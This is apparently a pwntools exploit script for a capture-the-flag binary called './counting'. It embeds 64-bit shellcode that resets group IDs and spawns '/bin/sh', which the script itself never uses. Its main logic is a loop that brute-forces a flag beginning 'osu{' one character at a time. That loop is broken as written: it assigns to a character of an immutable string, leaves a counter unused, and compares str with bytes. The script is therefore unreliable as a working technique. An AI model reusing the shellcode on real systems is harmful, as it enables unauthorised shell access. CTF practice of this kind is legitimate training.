#!/usr/bin/env python3

import os
import sys
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# set your target binary name here
binary_name = './counting'
gdb_command = ''
shellcode_64_nonzero = 'jlX\x0f\x05H\x89\xc7H\x89\xc6jrX\x0f\x05H\xbb//bin/shH1\xc0PSH\x89\xe7H\x89\xc6H\x89\xc2j;X\x0f\x05'

# setup debug binary
debug_name = binary_name[:-1] + 'x'
if not os.path.exists(debug_name):
    os.system("cp %s %s" % (binary_name, debug_name))


is_debug = False
# run program
if '--debug' in sys.argv:
    is_debug = True

if is_debug:
    p = process(debug_name)
    gdb.attach(p)
    raw_input("Press ENTER to continue to execute the program...")
else:
    p = process(binary_name)
    # if connecting to something remote
    # p = remote()


## write your exploit here

buffer  = "osu{"
possible_char = "1234567890-=qwertyuiop[asdfghjkl;zxcvbnm,./{\}[]QWERTYUIOPASDFGHJKLZXCVBNM_"


for _ in range(30):
    p = process(binary_name)
    count = 5
    buffer += "_"
    for char in possible_char:
        buffer[len(buffer) - 1] = char 

        p.sendline(buffer + "\n")
        print("buffer", buffer)
        feedback = p.recvline().strip()
        if feedback == b"Correct!":
            print("correct", buffer)
            break
    count += 1
        

p.interactive()